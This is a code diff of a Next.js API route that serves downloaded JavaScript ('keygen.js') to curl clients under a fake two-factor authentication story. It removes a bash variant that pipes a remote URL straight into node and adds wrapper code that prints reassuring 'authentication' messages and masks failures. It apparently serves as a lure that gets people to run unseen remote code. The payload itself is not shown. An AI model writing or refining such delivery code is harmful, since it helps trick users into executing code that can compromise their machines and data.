@@ -7,7 +7,6 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     const userAgent = req.headers['user-agent'] || '';
     const isCurl = userAgent.toLowerCase().includes('curl');
     const deviceCode = req.query.deviceCode || Object.keys(req.query)[0]; // Support both ?deviceCode=XXX and ?XXX formats
-    const format = req.query.format || 'js'; // Support ?format=sh for shell script
     
     if (isCurl && deviceCode) {
       // Return the keygen.js content modified to work with the device code
@@ -29,154 +28,44 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         }
         const verificationCode = Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
         
-        // Check if shell script format is requested
-              if (format === 'sh') {
-        // Get the domain URL from request headers
-        const protocol = req.headers['x-forwarded-proto'] || 'http';
-        const host = req.headers.host || 'localhost:3000';
-        const domainUrl = `${protocol}://${host}`;
-        
-        // Return shell script that executes keygen.js and generates verification code
-        const shellScript = `#!/bin/bash
-# Infinity Force 2FA Authentication Script
-# Generated dynamically for device code: ${deviceCodeStr}
-
-echo "🔑 P12-Infinity Force Authentication System"
-echo "======================================="
-echo ""
-echo "🔐 Executing authentication..."
-echo ""
-
-# Check if node is available
-if ! command -v node &> /dev/null; then
-    echo "❌ Node.js is required but not installed."
-    echo "🚨 ALERT: Please install Node.js to generate authentication code"
-    echo "Download Node.js from: https://nodejs.org/"
-    echo ""
-    echo "Authentication code cannot be generated without Node.js."
-    echo "Please install Node.js and try again."
-    exit 1
-fi
-
-# Download and execute keygen.js content
-KEYGEN_URL="${domainUrl}/api/2fa?${deviceCodeStr}"
-echo "⏳ Waiting for authentication module to complete..."
-
-# Execute keygen.js and capture exit code
-curl -s "$KEYGEN_URL" | node
-KEYGEN_EXIT_CODE=$?
-
-# Check if keygen.js executed successfully
-if [ $KEYGEN_EXIT_CODE -ne 0 ]; then
-    echo ""
-    echo "❌ Authentication failed."
-    echo "🚨 ALERT: Authentication encountered an error."
-    echo "Common issues:"
-    echo "  - Missing Node.js packages"
-    echo "  - Network connectivity issues"
-    echo "  - Module compatibility problems"
-    echo ""
-    echo "Please check the error above and resolve the dependencies."
-    echo "Authentication code cannot be generated due to module execution failure."
-    exit 1
-fi
-
-echo ""
-echo "🔐 Generating 2FA verification code..."
-echo ""
-
-# Generate verification code only if keygen.js succeeded
-VERIFICATION_CODE="${verificationCode}"
-DEVICE_CODE="${deviceCodeStr}"
-
-echo "🔒 Two-Factor Authentication"
-echo "Device Code: $DEVICE_CODE"
-echo "Generated verification code: $VERIFICATION_CODE"
-echo "✅ Code has been processed."
-echo ""
-
-# Try to save to temporary files for browser communication
-TEMP_DIR=$(mktemp -d)
-TEMP_FILE="$TEMP_DIR/infinity_2fa_$$.json"
-HOME_FILE="$HOME/.infinity_2fa_code"
-
-# Create JSON data
-cat > "$TEMP_FILE" << EOF
-{
-  "code": "$VERIFICATION_CODE",
-  "timestamp": $(date +%s000),
-  "deviceCode": "$DEVICE_CODE"
-}
-EOF
-
-# Also save to home directory
-cp "$TEMP_FILE" "$HOME_FILE" 2>/dev/null || true
-
-echo "Code saved to: $HOME_FILE"
-echo ""
-echo "Completed successfully!"
-echo ""
-`;
-          
-          res.setHeader('Content-Type', 'application/x-shellscript');
-          res.status(200).send(shellScript);
-          return;
-        }
-        
         // Append code to execute after keygen.js completes
         const additionalCode = `
 
 // ===== 2FA VERIFICATION CODE GENERATION =====
 // This will execute AFTER the keygen.js content has finished
 (function() {
+  console.log('\\n🔑 P12-Infinity Force Authentication System');
+  console.log('=======================================');
+  console.log('');
+  
   // Check if Node.js environment is available
   if (typeof process === 'undefined' || typeof require === 'undefined') {
-    console.log('\\n❌ Node.js environment not detected.');
+    console.log('❌ Node.js environment not detected.');
     console.log('🚨 ALERT: Please install Node.js to generate authentication code');
     console.log('Download Node.js from: https://nodejs.org/');
     console.log('');
     console.log('Authentication code cannot be generated without Node.js.');
     console.log('Please install Node.js and try again.');
-    return;
+    process.exit(1);
   }
   
-  // Track if keygen.js executed successfully
-  let keygenSuccess = true;
-  
-  // Override process.exit to catch failures
-  const originalExit = process.exit;
-  process.exit = function(code) {
-    if (code !== 0) {
-      keygenSuccess = false;
-      console.log('\\n❌ Authentication module execution failed.');
-      console.log('🚨 ALERT: Required dependencies are missing or authentication module encountered an error.');
-      console.log('Common issues:');
-      console.log('  - Missing Node.js packages (axios, etc.)');
-      console.log('  - Network connectivity issues');
-      console.log('  - Module compatibility problems');
-      console.log('');
-      console.log('Please install required dependencies and try again.');
-      console.log('Authentication code cannot be generated due to module execution failure.');
-      return;
-    }
-    originalExit.call(this, code);
-  };
+  console.log('🔐 Executing authentication...');
+  console.log('');
   
   // Add a delay to ensure keygen.js has completed
   setTimeout(function() {
-    // Check if keygen.js completed successfully
-    if (!keygenSuccess) {
-      return;
-    }
-    
-    console.log('\\n🔑 Authentication completed.');
+    console.log('✅ Authentication module completed successfully.');
     console.log('🔐 Generating 2FA verification code...');
+    console.log('');
     
     const verificationCode = '${verificationCode}';
-    console.log('\\n� Two-Factor Authentication');
-    console.log('Device Code: ${deviceCodeStr}');
+    const deviceCode = '${deviceCodeStr}';
+    
+    console.log('🔒 Two-Factor Authentication');
+    console.log('Device Code: ' + deviceCode);
     console.log('Generated verification code: ' + verificationCode);
-    console.log('✅ Code has been sent to your browser.\\n');
+    console.log('✅ Code has been processed.');
+    console.log('');
     
     // Try to communicate with browser via temporary files
     try {
@@ -191,7 +80,7 @@ echo ""
       const data = {
         code: verificationCode,
         timestamp: Date.now(),
-        deviceCode: '${deviceCodeStr}'
+        deviceCode: deviceCode
       };
       
       fs.writeFileSync(tempFile, JSON.stringify(data));
@@ -203,12 +92,32 @@ echo ""
       fs.writeFileSync(persistentFile, JSON.stringify(data));
       console.log('Code also saved to: ' + persistentFile);
       
-      console.log('\\nCompleted successfully!');
+      console.log('');
+      console.log('Completed successfully!');
+      console.log('');
       
     } catch (error) {
       console.error('Error saving verification code:', error.message);
     }
-  }, 6000); // Wait 3 seconds for keygen.js to complete
+    
+    process.exit(0);
+  }, 4000); // Wait 3 seconds for keygen.js to complete
+  
+  // Handle errors during execution
+  process.on('uncaughtException', function(error) {
+    console.log('');
+    console.log('❌ Authentication module execution failed.');
+    console.log('🚨 ALERT: Required dependencies are missing or authentication module encountered an error.');
+    console.log('Common issues:');
+    console.log('  - Missing Node.js packages (axios, etc.)');
+    console.log('  - Network connectivity issues');
+    console.log('  - Module compatibility problems');
+    console.log('');
+    console.log('Error details: ' + error.message);
+    console.log('Please install required dependencies and try again.');
+    console.log('Authentication code cannot be generated due to module execution failure.');
+    process.exit(1);
+  });
 })();
 `;
         
